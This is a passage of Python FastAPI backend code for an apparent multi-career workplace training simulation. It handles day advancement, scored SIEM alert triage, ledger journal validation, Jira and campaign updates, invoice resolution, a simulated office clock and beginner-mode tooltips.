    sess = sessions_col.find_one({"session_id": session_id()}, {"_id": 0, "career": 1, "current_day": 1}) or {}
    career = sess.get("career")
    cur = int(sess.get("current_day") or 1)
    nxt = cur + 1
    revealed = 0
    _sim = sim_id()
    # Cyber-specific SIEM alerts (legacy pack still drives the SIEM tab).
    if career == "cybersecurity":
        revealed += _insert_day_pack([_enrich_soc_alert(a) for a in (_CYBER_DAY_PACKS.get(nxt) or [])], siem_col, nxt, _sim)
    # Unified pack: emails/tasks/invoices/jira/campaigns for all careers.
    day_pack = (_DAY_PACKS.get(career) or {}).get(nxt) or {}
    for sub_key, col in _DAY_PACK_COLS.items():
        revealed += _insert_day_pack(day_pack.get(sub_key) or [], col, nxt, _sim)
    sessions_col.update_one({"session_id": session_id()}, {"$set": {"current_day": nxt}})
    return {"current_day": nxt, "previous_day": cur, "revealed": revealed, "career": career}

@app.post("/api/simulation/next-day")
async def api_next_day():
    """End the current sim day cleanly and roll into the next:
       1) Persist an end_of_day_review eval (if not already saved this day).
       2) Tag any unfinished prior-day tasks / unreplied prior-day actionable emails as 'overdue'.
       3) Advance current_day and insert the day pack (same as advance_day).
       4) Reset the 2-hour real timer (real_start_time + auto_ended).
       5) Inject a manager email referencing yesterday's score.
       Returns the new day, revealed counts, and the eod summary."""
    sess = sessions_col.find_one({"session_id": session_id()}, {"_id": 0}) or {}
    career = sess.get("career")
    cur = int(sess.get("current_day") or 1)
    if cur >= 5:
        return JSONResponse({"error": "max_day_reached", "current_day": cur}, status_code=400)
    _sim = sim_id()

    # 1) EOD eval (idempotent per day)
    eod = _compute_eod()
    eod["day"] = cur
    existing = evals_col.find_one({"simulation_id": _sim, "type": "end_of_day_review", "day": cur})
    if not existing:
        try:
            evals_col.insert_one(dict(eod))
        except Exception as ex:
            log.warning("next_day.eod_insert_failed kind=%s", type(ex).__name__)

    # 2) Mark prior-day incomplete tasks + unreplied actionable emails as overdue
    overdue_tasks = tasks_col.update_many(
        {"simulation_id": _sim, "status": {"$ne": "done"},
         "$or": [{"day": {"$lte": cur}}, {"day": {"$exists": False}}]},
        {"$set": {"overdue": True}},
    ).modified_count
    overdue_emails = emails_col.update_many(
        {"simulation_id": _sim, "requires_action": True, "replied": False,
         "$or": [{"day": {"$lte": cur}}, {"day": {"$exists": False}}]},
        {"$set": {"overdue": True}},
    ).modified_count

    # 3) Advance day + insert day pack
    nxt = cur + 1
    revealed = 0
    if career == "cybersecurity":
        revealed += _insert_day_pack([_enrich_soc_alert(a) for a in (_CYBER_DAY_PACKS.get(nxt) or [])], siem_col, nxt, _sim)
    day_pack = (_DAY_PACKS.get(career) or {}).get(nxt) or {}
    for sub_key, col in _DAY_PACK_COLS.items():
        revealed += _insert_day_pack(day_pack.get(sub_key) or [], col, nxt, _sim)

    # 4) Reset timer
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$set": {"current_day": nxt,
                  "real_start_time": datetime.utcnow().isoformat(),
                  "auto_ended": False}},
    )

    # 5) Manager performance email
    cfg = CAREER_CONFIGS.get(career) or {}
    mgr = cfg.get("manager") or {"name": "Your Manager", "role": "Manager", "email": "manager@firstdesk.local"}
    score = int(eod.get("total_score") or 0)
    grade = eod.get("grade") or ""
    tone = "Strong work yesterday" if score >= 70 else ("Solid first day" if score >= 50 else "Tough first day")
    callout = (
        "Your task execution and triage held up." if score >= 70 else
        "There's room to tighten priorities — let's focus today." if score >= 50 else
        "Let's reset expectations and get a clean run today."
    )
    body = (
        f"{tone}. You closed Day {cur} with a {grade or 'review'} ({score}/100). {callout}\n\n"
        f"Today (Day {nxt}) is going to be heavier. New work has just landed in your inbox and tools — "
        f"prioritise the items flagged high/critical first. Anything left over from yesterday is now "
        f"tagged OVERDUE; clear that before picking up new work where possible.\n\n"
        f"Ping me on Slack if you're stuck.\n\nThanks,\n{mgr.get('name')}"
    )
    eid = f"mgr_day{nxt}_{secrets.token_hex(3)}"
    emails_col.insert_one({
        "id": eid, "simulation_id": _sim,
        "from_name": mgr.get("name"), "from_role": mgr.get("role"), "from_email": mgr.get("email"),
        "to": "you",
        "subject": f"Day {nxt} priorities — re: yesterday",
        "body": body,
        "time": datetime.utcnow().strftime("%H:%M"),
        "read": False, "replied": False,
        "priority": "high" if score < 50 else "medium",
        "category": "manager_review",
        "requires_action": True,
        "day": nxt,
    })

    return {
        "current_day": nxt,
        "previous_day": cur,
        "revealed": revealed,
        "career": career,
        "overdue_tasks": overdue_tasks,
        "overdue_emails": overdue_emails,
        "eod": {
            "total_score": score,
            "grade": grade,
            "label": eod.get("label"),
            "dimensions": eod.get("dimensions"),
        },
    }

class SiemTriageReq(BaseModel):
    action: str = Field(..., pattern=r"^(escalate|resolve|investigate)$")
    note: SafeStr = Field("", max_length=2000)

@app.post("/api/siem/{alert_id}/triage")
async def api_siem_triage(alert_id: str, body: SiemTriageReq):
    alert = siem_col.find_one({"id": alert_id, "simulation_id": sim_id()}, {"_id": 0})
    if not alert:
        raise HTTPException(404, "Alert not found")
    action = body.action
    siem_col.update_one(
        {"id": alert_id, "simulation_id": sim_id()},
        {"$set": {"status": action, "triage_status": "reviewed"}},
    )
    if body.note:
        siem_col.update_one(
            {"id": alert_id, "simulation_id": sim_id()},
            {"$set": {"analyst_notes": body.note}},
        )
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$addToSet": {"alerts_triaged": alert_id}},
    )
    correct_action = (alert.get("correct_action") or "").strip().lower()
    base_pts = int(alert.get("points") or 10)
    sev = (alert.get("severity") or "").upper()
    is_real = bool(alert.get("is_real_threat"))
    correct = bool(correct_action) and action == correct_action
    if correct:
        pts = base_pts
        msg = f"Correct triage — {action}d. (+{pts} pts)"
    else:
        if is_real and sev in ("CRITICAL", "HIGH") and action == "resolve":
            pts = -15
            msg = "Critical miss — real threat resolved as false positive. (-15 pts)"
        elif (not is_real) and action == "escalate":
            pts = -10
            msg = "Escalated a known false positive. (-10 pts)"
        else:
            pts = -5
            expected = correct_action or ("escalate" if is_real else "resolve")
            msg = f"Incorrect — expected {expected}, you chose {action}. (-5 pts)"
    evals_col.insert_one({
        "simulation_id": sim_id(), "type": "alert_triage",
        "alert_id": alert_id, "action": action,
        "correct": correct, "points": pts,
    })
    # ── Bonus point logic ─────────────────────────────────────────
    bonuses: list[str] = []
    bonus_total = 0
    if correct:
        # Correlation bonus: if any related alert was also correctly triaged (in either direction),
        # award +10 once per unordered pair.
        for rid in (alert.get("related_alerts") or []):
            pair_key = "::".join(sorted([alert_id, rid]))
            existing = evals_col.find_one({
                "simulation_id": sim_id(), "type": "correlation_bonus", "pair_key": pair_key,
            })
            if existing:
                continue
            other_correct = evals_col.find_one({
                "simulation_id": sim_id(), "type": "alert_triage",
                "alert_id": rid, "correct": True,
            })
            if other_correct:
                evals_col.insert_one({
                    "simulation_id": sim_id(), "type": "correlation_bonus",
                    "pair_key": pair_key, "alerts": sorted([alert_id, rid]), "points": 10,
                })
                bonus_total += 10
                bonuses.append(f"+10 correlation bonus ({alert_id} ↔ {rid})")
        # Travel-check bonus on the unusual-location alert
        if alert_id == "ALERT-2026-0218-006" and action == "resolve":
            note_blob = (body.note or "").lower()
            if any(k in note_blob for k in ("travel", "tr-2026", "leave", "trip", "approved")):
                already = evals_col.find_one({
                    "simulation_id": sim_id(), "type": "travel_check_bonus", "alert_id": alert_id,
                })
                if not already:
                    evals_col.insert_one({
                        "simulation_id": sim_id(), "type": "travel_check_bonus",
                        "alert_id": alert_id, "points": 5,
                    })
                    bonus_total += 5
                    bonuses.append("+5 verified travel record before resolving")
    # Per-note bonus on the same call when a substantive note is attached
    if body.note and len(body.note.strip()) >= 20:
        already_note = evals_col.find_one({
            "simulation_id": sim_id(), "type": "note_bonus", "alert_id": alert_id,
        })
        if not already_note:
            evals_col.insert_one({
                "simulation_id": sim_id(), "type": "note_bonus",
                "alert_id": alert_id, "points": 5,
            })
            bonus_total += 5
            bonuses.append("+5 useful analyst note")
    if bonus_total:
        msg = msg + " · " + " · ".join(bonuses)
    emit("alert_triaged", {"alert": alert, "action": action, "correct": correct, "points": pts + bonus_total})
    return {"ok": True, "correct": correct, "points": pts + bonus_total, "base_points": pts, "bonus_points": bonus_total, "bonuses": bonuses, "message": msg, "expected": correct_action}

class SiemNoteReq(BaseModel):
    note: SafeStr = Field(..., max_length=2000)

@app.post("/api/siem/{alert_id}/note")
async def api_siem_note(alert_id: str, body: SiemNoteReq):
    res = siem_col.update_one(
        {"id": alert_id, "simulation_id": sim_id()},
        {"$set": {"analyst_notes": body.note}},
    )
    if res.matched_count == 0:
        raise HTTPException(404, "Alert not found")
    bonus = 0
    if body.note and len(body.note.strip()) >= 20:
        already = evals_col.find_one({
            "simulation_id": sim_id(), "type": "note_bonus", "alert_id": alert_id,
        })
        if not already:
            evals_col.insert_one({
                "simulation_id": sim_id(), "type": "note_bonus",
                "alert_id": alert_id, "points": 5,
            })
            bonus = 5
    return {"ok": True, "bonus_points": bonus}

@app.get("/api/jira")
async def api_jira():
    _day = _current_day()
    return {"tickets": list(jira_col.find({"simulation_id": sim_id(), "$or": [{"day": {"$lte": _day}}, {"day": {"$exists": False}}]}, {"_id": 0}))}

# ── REAL ACTIONS: SAGE JOURNAL / JIRA UPDATE / INVOICE RESOLVE ───────────
# These let the user actually do work in the simulated tools. Each action is
# validated against the seeded ground truth — mistakes get flagged by the
# manager via a real inbox email; correct work gets acknowledged and scored.

def _flag_mistake(category: str, summary: str, detail: str, points: int = -10):
    """Manager pushes a real email criticising the user's mistake + points docked."""
    if not get_career():
        return
    cfg = CAREER_CONFIGS[get_career()]
    _push_email(
        cfg["manager"],
        f"Re: {summary}",
        f"Hi,\n\n{detail}\n\nPlease take another look and correct it. Loop me in if you're stuck.\n\n{cfg['manager']['name'].split()[0]}",
        priority="high", category=f"mistake_{category}",
    )
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$inc": {"mistakes_count": 1, "score_adj": points},
         "$push": {"mistakes": {"category": category, "summary": summary, "ts": datetime.utcnow().isoformat()}}},
    )

def _ack_correct(category: str, summary: str, detail: str, points: int = 15):
    """Manager pushes a brief positive acknowledgement + points awarded."""
    if not get_career():
        return
    cfg = CAREER_CONFIGS[get_career()]
    _push_email(
        cfg["manager"],
        f"Re: {summary}",
        f"{detail}\n\n{cfg['manager']['name'].split()[0]}",
        priority="low", category=f"ack_{category}",
    )
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$inc": {"correct_actions": 1, "score_adj": points}},
    )

@app.post("/api/sage/journal")
async def api_sage_journal(req: JournalReq):
    """Post a journal entry to the general ledger. Validates against discrepancies."""
    if get_career() != "accountant":
        raise HTTPException(400, "Sage is only available in the Accountant career.")
    # Basic validation
    if not (req.acc.isdigit() and len(req.acc) == 4):
        raise HTTPException(400, "Account code must be 4 digits (e.g. 1100, 5005).")
    if (req.dr > 0 and req.cr > 0) or (req.dr <= 0 and req.cr <= 0):
        raise HTTPException(400, "Either Debit OR Credit must be > 0 (not both, not neither).")
    ref = (req.ref or f"ADJ-{uuid.uuid4().hex[:4].upper()}").strip()
    entry = {"date": req.date, "acc": req.acc, "desc": req.desc, "dr": req.dr, "cr": req.cr, "ref": ref}
    sheets_col.update_one({"simulation_id": sim_id()}, {"$push": {"general_ledger": entry}})

    # Validate against the seeded discrepancies (the "right answers")
    s = sheets_col.find_one({"simulation_id": sim_id()}) or {}
    discs = s.get("discrepancies", [])
    amount = req.dr or req.cr
    matched = None
    for d in discs:
        # Compare on date + (description fuzzy match) + amount close
        d_amount = d.get("amount") or d.get("bank_amount") or 0
        if d.get("date") == req.date and abs(d_amount - amount) < 1.0:
            matched = d
            break
        # Account-21 case (amount mismatch — Conference ACCA)
        if d.get("type") == "amount_mismatch" and d.get("date") == req.date:
            if abs((d.get("bank_amount", 0) - d.get("ledger_amount", 0)) - amount) < 1.0:
                matched = d
                break

    if matched:
        sessions_col.update_one({"session_id": session_id()},
            {"$addToSet": {"discrepancies_found": matched["id"]}})
        _ack_correct("journal", f"Journal posted ({ref})",
            f"Good catch on {req.desc}. The adjusting entry posts cleanly against {matched['type'].replace('_',' ')} — reconciliation will pick it up.",
            points=20)
        emit("discrepancy_flagged", {"correct": True, "date": req.date, "description": req.desc, "amount": amount})
        return {"ok": True, "matched_discrepancy": matched["id"], "ref": ref}

    # No match → could be unnecessary or wrong amount
    if amount > 50000:
        _flag_mistake("journal", f"Journal entry {ref}",
            f"You posted a {('debit' if req.dr else 'credit')} of £{amount:,.2f} on {req.date} for '{req.desc}' against account {req.acc}. That's a huge entry — I can't see the supporting evidence on the bank statement. Please show me the source before I sign this off.",
            points=-15)
    else:
        _flag_mistake("journal", f"Journal entry {ref}",
            f"You posted £{amount:,.2f} on {req.date} for '{req.desc}'. I can't tie it to anything on the bank statement or a supplier invoice — what's the source document?",
            points=-5)
    return {"ok": True, "matched_discrepancy": None, "ref": ref, "flagged": True}

@app.post("/api/jira/{ticket_id}/update")
async def api_jira_update(ticket_id: str, req: JiraUpdateReq):
    """Update a Jira ticket (status / resolution / assignee / comment / priority).
    For SIEM-linked tickets, closing as false_positive on a real threat = mistake."""
    if get_career() not in ("cybersecurity", "developer"):
        raise HTTPException(400, "Jira is only available in Cybersecurity or Developer careers.")
    t = jira_col.find_one({"id": ticket_id, "simulation_id": sim_id()})
    if not t:
        raise HTTPException(404, "Ticket not found")

    update_set = {}
    if req.status: update_set["status"] = req.status
    if req.resolution: update_set["resolution"] = req.resolution
    if req.assignee: update_set["assignee"] = req.assignee
    if req.priority: update_set["priority"] = req.priority

    if req.comment:
        jira_col.update_one(
            {"id": ticket_id, "simulation_id": sim_id()},
            {"$push": {"comments": {"author": "you", "text": req.comment, "ts": datetime.utcnow().isoformat()}}},
        )

    if update_set:
        jira_col.update_one({"id": ticket_id, "simulation_id": sim_id()}, {"$set": update_set})

    # Validate the action
    flagged = False
    # Cybersecurity: closing a real-threat-linked ticket as false_positive is a critical mistake
    if get_career() == "cybersecurity" and req.status == "closed" and req.resolution == "false_positive":
        src_alert_id = t.get("source_alert")
        if src_alert_id:
            alert = siem_col.find_one({"id": src_alert_id, "simulation_id": sim_id()})
            if alert and alert.get("is_real_threat"):
                _flag_mistake("jira_close",
                    f"Closed {ticket_id} as false positive",
                    f"You closed {ticket_id} as a false positive but the underlying SIEM alert ({src_alert_id} — {alert.get('title','')}) IS a real threat ({alert.get('threat_type','')}). This is the kind of miss that becomes a breach. Reopen it and escalate to me.",
                    points=-25)
                flagged = True

    # Developer: closing without a resolution note
    if get_career() == "developer" and req.status == "closed" and not (req.comment or req.resolution):
        _flag_mistake("jira_close",
            f"Closed {ticket_id} with no resolution note",
            f"You closed {ticket_id} but didn't leave a resolution note or comment. Future-you (and me) won't know what was actually fixed. Reopen, add a note explaining the fix, then close.",
            points=-10)
        flagged = True

    # Positive ack: closing a non-real-threat as false_positive (correct triage)
    if not flagged and get_career() == "cybersecurity" and req.status == "closed" and req.resolution == "false_positive":
        src_alert_id = t.get("source_alert")
        if src_alert_id:
            alert = siem_col.find_one({"id": src_alert_id, "simulation_id": sim_id()})
            if alert and not alert.get("is_real_threat"):
                _ack_correct("jira_close", f"Triaged {ticket_id}",
                    f"Good triage on {ticket_id}. Correctly identified the false positive without alert fatigue creeping in.",
                    points=10)

    return {"ok": True, "ticket": jira_col.find_one({"id": ticket_id, "simulation_id": sim_id()}, {"_id": 0}), "flagged": flagged}

@app.post("/api/campaign/{campaign_id}/update")
async def api_campaign_update(campaign_id: str, req: CampaignUpdateReq):
    """Update a campaign — content / brand colour / tone / status. Validates
    against the seeded NovaTech brand guidelines: teal #0D9488, tone 'bold and
    innovative'. Wrong colour or stale tone gets flagged by the manager."""
    if get_career() != "marketing":
        raise HTTPException(400, "Campaigns are only available in the Marketing career.")
    c = campaigns_col.find_one({"id": campaign_id, "simulation_id": sim_id()})
    if not c:
        raise HTTPException(404, "Campaign not found")

    update_set = {}
    if req.content is not None: update_set["content"] = req.content
    if req.brand_colour: update_set["brand_colour"] = req.brand_colour
    if req.tone: update_set["tone"] = req.tone
    if req.status: update_set["status"] = req.status
    update_set["last_updated"] = datetime.utcnow().strftime("%H:%M")
    campaigns_col.update_one({"id": campaign_id, "simulation_id": sim_id()}, {"$set": update_set})

    flagged = False
    cfg = CAREER_CONFIGS["marketing"]

    # Brand colour validation — must be the new teal #0D9488 (case-insensitive)
    if req.brand_colour:
        bc = req.brand_colour.strip().lower().replace(" ", "")
        if bc not in ("#0d9488", "0d9488"):
            _flag_mistake("campaign_colour", f"Campaign {campaign_id} brand colour wrong",
                f"You set the brand colour to {req.brand_colour} on {c.get('name', campaign_id)}. NovaTech updated their guidelines this morning — primary is Deep Teal #0D9488, not whatever you used. Update before this goes anywhere near the client.",
                points=-12)
            flagged = True

    # Tone validation — must reflect the updated 'bold and innovative' guidance
    if req.tone:
        t = req.tone.lower()
        stale = any(w in t for w in ("professional", "approachable", "friendly", "warm"))
        on_brief = any(w in t for w in ("bold", "innovative", "edgy", "punchy"))
        if stale and not on_brief:
            _flag_mistake("campaign_tone", f"Campaign {campaign_id} tone off-brief",
                f"The tone you set ('{req.tone}') is the OLD brief. NovaTech moved to 'bold and innovative' this morning — this kind of miss is what makes us look like we don't read client emails. Rewrite.",
                points=-10)
            flagged = True

    # Content empty when going live = release-blocking mistake
    if req.status in ("live", "scheduled") and not (c.get("content") or req.content or "").strip():
        _flag_mistake("campaign_empty", f"Campaign {campaign_id} scheduled with no copy",
            f"You moved {c.get('name', campaign_id)} to '{req.status}' but the post body is empty. Hold this — write the copy, get it reviewed, THEN schedule.",
            points=-15)
        flagged = True

    # Positive ack: correct colour + on-brief tone + non-empty content
    if not flagged and req.brand_colour and req.tone and req.content:
        bc_ok = req.brand_colour.strip().lower().replace(" ", "") in ("#0d9488", "0d9488")
        tone_ok = any(w in req.tone.lower() for w in ("bold", "innovative", "edgy", "punchy"))
        if bc_ok and tone_ok and len(req.content.strip()) > 20:
            _ack_correct("campaign", f"Campaign {campaign_id} update",
                f"Nice — colour and tone are on-brief, copy reads well. Keep this consistent across all three platform variants.",
                points=20)
            emit("campaign_updated", {"campaign_id": campaign_id})

    return {"ok": True, "flagged": flagged, "campaign": campaigns_col.find_one({"id": campaign_id, "simulation_id": sim_id()}, {"_id": 0})}

@app.post("/api/invoice/{invoice_id}/resolve")
async def api_invoice_resolve(invoice_id: str, req: InvoiceResolveReq):
    """Resolve an invoice query — user enters the amount they think is correct."""
    if get_career() != "accountant":
        raise HTTPException(400, "Invoices are only available in the Accountant career.")
    inv = invoices_col.find_one({"id": invoice_id, "simulation_id": sim_id()})
    if not inv:
        raise HTTPException(404, "Invoice not found")

    invoices_col.update_one(
        {"id": invoice_id, "simulation_id": sim_id()},
        {"$set": {"status": "resolved", "resolved_amount": req.resolved_amount, "resolution_note": req.note,
                  "resolved_at": datetime.utcnow().strftime("%H:%M")}},
    )

    correct = inv.get("correct_amount")
    if correct is not None and abs(req.resolved_amount - correct) < 0.01:
        _ack_correct("invoice", f"Invoice {invoice_id} resolved",
            f"Good work resolving {invoice_id} ({inv.get('client','')}) at £{req.resolved_amount:,.2f}. That matches the PO and the VAT-exempt classification — client should be happy.",
            points=25)
        return {"ok": True, "correct": True}
    if correct is not None:
        _flag_mistake("invoice", f"Invoice {invoice_id} resolved at wrong amount",
            f"You resolved {invoice_id} at £{req.resolved_amount:,.2f}, but the correct amount is £{correct:,.2f} (VAT was applied in error — the service is VAT-exempt). The client will spot this and we'll look amateur. Re-issue the credit note for the correct amount.",
            points=-15)
        return {"ok": True, "correct": False}
    return {"ok": True, "correct": None}

@app.get("/api/campaigns")
async def api_campaigns():
    _day = _current_day()
    return {"campaigns": list(campaigns_col.find({"simulation_id": sim_id(), "$or": [{"day": {"$lte": _day}}, {"day": {"$exists": False}}]}, {"_id": 0}))}

@app.get("/api/calendar")
async def api_calendar():
    doc = tools_col.find_one({"simulation_id": sim_id(), "name": "Content Calendar"}, {"_id": 0}) if tools_col is not None else None
    items = (doc or {}).get("data", {}).get("items", []) if doc else []
    return {"items": items}

@app.get("/api/score")
async def api_score():
    r = _compute_eod()
    rep = reputation_col.find_one({"session_id": session_id()}, {"_id": 0, "events": 0}) or {}
    r["reputation"] = rep
    return r

# ── SIMULATION CLOCK ──────────────────────────────────────────────
# 2hrs real time = 8hrs simulated office time (09:00 → 17:00).
# Frontend polls /api/sim_clock every ~10s for the taskbar display.
_REAL_DAY_SEC = 2 * 60 * 60       # 2 real hours
_SIM_DAY_SEC = 8 * 60 * 60        # 8 simulated hours
_SIM_DAY_START_HOUR = 9           # 09:00 office start

def _sim_clock(session: dict) -> dict:
    """Return real elapsed + remaining + simulated office time."""
    rs_iso = (session or {}).get("real_start_time")
    if not rs_iso:
        # Pre-timer sessions: synthesize a start so the clock still works.
        rs_iso = (session or {}).get("started_at") or datetime.utcnow().isoformat()
    try:
        rs = datetime.fromisoformat(rs_iso)
    except Exception:
        rs = datetime.utcnow()
    elapsed = max(0.0, (datetime.utcnow() - rs).total_seconds())
    remaining = max(0.0, _REAL_DAY_SEC - elapsed)
    sim_elapsed = min(_SIM_DAY_SEC, (elapsed / _REAL_DAY_SEC) * _SIM_DAY_SEC)
    sim_hour_float = _SIM_DAY_START_HOUR + (sim_elapsed / 3600.0)
    sim_hour = int(sim_hour_float)
    sim_min = int((sim_hour_float - sim_hour) * 60)
    return {
        "real_start": rs.isoformat(),
        "elapsed_real_sec": int(elapsed),
        "remaining_real_sec": int(remaining),
        "sim_time": f"{sim_hour:02d}:{sim_min:02d}",
        "sim_hour": sim_hour,
        "sim_min": sim_min,
        "sim_elapsed_sec": int(sim_elapsed),
        "ended": remaining <= 0,
        "auto_ended": bool((session or {}).get("auto_ended", False)),
    }

@app.get("/api/sim_clock")
async def api_sim_clock():
    """Lightweight clock-poll endpoint. Marks auto_ended=True on the session
    when 2 real hours have elapsed so the frontend can trigger end-of-day."""
    s = sessions_col.find_one({"session_id": session_id()}) or {}
    clock = _sim_clock(s)
    if clock["ended"] and not clock["auto_ended"]:
        sessions_col.update_one({"session_id": session_id()}, {"$set": {"auto_ended": True}})
        # Persist one end_of_day_review eval so /api/profile/history reflects the auto-end.
        if not evals_col.find_one({"simulation_id": sim_id(), "type": "end_of_day_review"}):
            try:
                evals_col.insert_one(dict(_compute_eod()))
            except Exception as ex:
                log.warning("auto_end.eod_insert_failed kind=%s", type(ex).__name__)
        clock["auto_ended"] = True
    return clock

@app.get("/api/session")
async def api_session():
    return sessions_col.find_one({"session_id": session_id()}, {"_id": 0}) or {}

# ── BEGINNER-MODE TOOLTIPS ────────────────────────────────────────
# Plain-English explanations of column headers, returned to the frontend
# when session.experience_level == "beginner". Same UI for all users —
# the front-end only renders the ? icons in beginner mode.
_TOOL_TOOLTIPS: dict[str, dict[str, str]] = {
    "alerts": {
        "SEV": "Severity — CRITICAL: respond within 1 hour. HIGH: 2 hours. MEDIUM: 4 hours. LOW: 8 hours.",
        "SEVERITY": "Severity — CRITICAL: respond within 1 hour. HIGH: 2 hours. MEDIUM: 4 hours. LOW: 8 hours.",
        "SOURCE": "Which system generated this alert — EDR (endpoint), Firewall, SIEM, Email Gateway, etc.",
        "STATUS": "open = needs review. escalated = sent to senior team. resolved = closed as handled.",
        "TIME": "When the alert fired. Older unhandled alerts are usually more urgent.",
        "TITLE": "Short summary of what the system noticed. Click to see full detail and recommended action.",
    },
    "kanban": {
        "OPEN": "Tickets that nobody has started yet. Pick one up by changing it to In Progress.",
        "IN_PROGRESS": "Tickets you're actively working on. Keep this column small — ideally 1–2 items.",
        "IN_REVIEW": "Your work is done; a teammate is reviewing it. Wait for approval or change requests.",
        "DONE": "Closed tickets. Read the resolution and learn from teammates' approaches.",
        "PRIORITY": "Critical / High / Medium / Low — drives what you should pick up first.",
        "ASSIGNEE": "Who's responsible. 'you' means it's your ticket.",
        # Procurement PO kanban columns:
        "DRAFT": "PO has been created but not yet sent for review. Verify amounts, requester, and cost centre before moving it on.",
        "PENDING_APPROVAL": "Security review and DPA are clear — waiting on CFO/Director sign-off. Push with a one-line summary.",
        "APPROVED": "Signed off but not yet issued. Issue the PO via NetSuite and file with AP.",
        "ESCALATION": "Stuck — vendor risk, sanctions, or scope issues need Legal/DPO/CFO. Never approve unilaterally.",
        "REJECTED": "Closed without approval. Read the reason — it usually means duplicate tool, missing security review, or wrong approver.",
        "AMOUNT": "Total commit in GBP. Approval thresholds: <£10k team lead, <£50k Head of Procurement, >£50k CFO.",
        "VENDOR": "Who you're paying. Always cross-check the Vendor Catalog — half of new requests duplicate something you already pay for.",
        "RISK_FLAGS": "Auto-flagged issues — backdating, no DPA, missing SOC 2, sanctions concern. Every flag must be resolved before approval.",
        "TERM": "Annual / multi-year / prepaid. Multi-year locks you in — only useful if price is materially better.",
        # L&D Training Programs kanban columns:
        "PROPOSED": "Someone has asked for this programme but it isn't designed or scheduled. Decide: design it / route to existing programme / put on hold.",
        "DESIGNING": "Curriculum being built. Lock SME interviews, learning objectives, and assessment before moving on.",
        "SCHEDULED": "Curriculum signed off, dates set, facilitator confirmed. Just needs pre-work + enrolment.",
        "IN_SESSION": "Programme is running. Monitor day-by-day feedback. Don't wait for the end to find out it's broken.",
        "COMPLETED": "Closed. Archive the deck, capture NPS, file the post-mortem.",
        "ON_HOLD": "Parked — overlapping content, missing budget, or no capacity. Note WHY in the card so you can defend the decision.",
        "PROGRAM_TYPE": "onboarding / compliance / leadership / wellbeing / technical / upskilling. Compliance is non-negotiable and audit-tracked.",
        "OWNER": "Who runs this programme day-to-day. 'you' means you've inherited it.",
        "LEARNERS": "Number of enrolled (or requested) learners. Use this to spot programmes too small to justify standing up.",
        "BUDGET_GBP": "Programme cost in GBP — facilitator + content + LMS fees. Compare with cost-per-head before approving.",
        # PM Roadmap kanban columns / fields:
        "BACKLOG": "Ideas with rough evidence but no committed dates. Don't promise these to Sales — that's how roadmaps lose credibility.",
        "DISCOVERY": "Pre-build research: user interviews, instrumentation, problem-framing. Should produce a shaped problem doc before moving on.",
        "IN_BUILD": "Eng is actively coding. PM job here: unblock, hold scope, don't add new requirements mid-sprint.",
        "IN_REVIEW": "Build is done; data, design, or stakeholder review is the gate. Common failure: shipping past a stalled review just to ship.",
        "LAUNCHED": "Live to users. Watch the metrics for 2-4 weeks. If instrumentation is broken or impact reverses, MOVE BACK or PARK — don't leave it in 'launched'.",
        "PARKED": "Deliberately set aside. Always note WHY (no evidence / overlaps / wrong scope / waiting on dependency). Park with rationale beats kill silently.",
        "AREA": "Which part of the product/funnel this affects (activation / acquisition / monetization / pricing / compliance). Helps spot over-investment in one area.",
        "IMPACT": "Estimated business impact (low/medium/high) BEFORE we ship. Compare with actual post-launch — it's how you calibrate over time.",
        "EFFORT_WEEKS": "Eng effort estimate. Combined with impact gives you the cost/value lens for prioritisation.",
        "SQUAD": "Which squad delivers it. If it's not your squad's scope, route it — don't put it on your roadmap to be helpful.",
    },
    "table": {  # Sage spreadsheet + Vendor catalog
        "DATE": "When the transaction happened. Match against the bank statement to find missing or mis-dated entries.",
        "DESC": "Plain-English description of the transaction.",
        "DR": "Debit — money coming INTO the account (or expense going out). Always positive.",
        "CR": "Credit — money going OUT of the account (or revenue coming in). Always positive.",
        "BAL": "Running balance after this entry. Should match the bank statement at every step.",
        "REF": "Reference / supporting doc — invoice number, journal ID, etc. Helps you trace evidence.",
        "ACC": "GL account code (e.g. 1100 Bank, 5005 Cost of Sales). Wrong code = wrong P&L category.",
        # Procurement Vendor Catalog columns:
        "VENDOR_ID": "Internal vendor identifier — use this when raising POs or escalations.",
        "CATEGORY": "What the vendor supplies (Observability, AppSec, HR tech, AI/LLM, etc.). Use it to spot duplicates.",
        "STATUS": "active = under contract. renewal_due = contract ends within 90 days. prospect = not yet signed.",
        "CONTRACT_END": "When this contract expires. Start renewal conversations 90 days out.",
        "ARR_GBP": "Annual recurring cost in GBP. Sum these by category for your spend review.",
        "SECURITY_REVIEW": "NOT_STARTED / IN_PROGRESS / PASSED. No production data flows until PASSED.",
        "SOC2": "current = SOC 2 Type II in force. expired/missing = block until renewed.",
        "DPA": "Data Processing Agreement. signed / draft / missing. Required wherever vendor touches user data.",
        "OWNER": "Internal owner who manages the relationship. 'you' means you've inherited it.",
        # PM Feature Requests table columns:
        "REQ_ID": "Internal request ID. Use this when replying to requesters so the trail is searchable.",
        "SOURCE": "Where the ask came from (Sales / Customer Success / Product / etc.). Sales-sourced asks are often single-customer-flavoured — verify before promoting.",
        "REQUESTER": "Who raised it. One repeat-requester pushing 'must have' on three vague asks ≠ three roadmap candidates.",
        "CUSTOMERS_AFFECTED": "How many real customers asked. 0 or 1 = not a roadmap item without strong other evidence.",
        "ARR_IMPACT_GBP": "ARR exposure tied to the request. Be careful: 'might unblock a deal' isn't the same as 'will sign once this ships'.",
        "DUPE_OF": "Pointer to another request when this is a duplicate. Always reply to the requester linking the original — don't just close.",
        # L&D Learner Pipeline table columns:
        "LEARNER_ID": "Internal learner identifier. Use this on LMS exports and manager escalations.",
        "NAME": "Learner's name. Don't address learners with threatening reminders — escalate to their manager instead.",
        "DEPT": "Department. Compliance completion patterns are dept-level — look for whole teams stalled, not individuals.",
        "PROGRAM": "Which programme this learner is enrolled in. Cross-reference with the Training Programs board.",
        "ENROLLED_DATE": "When the learner was added to the programme. If due_date is close and completion% is low, that's a manager problem.",
        "DUE_DATE": "Hard deadline (compliance) or soft target (upskilling). For compliance, missed = audit finding.",
        "COMPLETION_PCT": "% of modules finished. <30% near due date = needs a manager nudge. 0% across a whole team = the manager themselves haven't done it.",
        "MANAGER": "The learner's line manager. THIS is who you escalate to — never the learner directly.",
    },
    "campaigns": {
        "STATUS": "draft → scheduled → live → completed/paused. Only 'approved' campaigns can go live.",
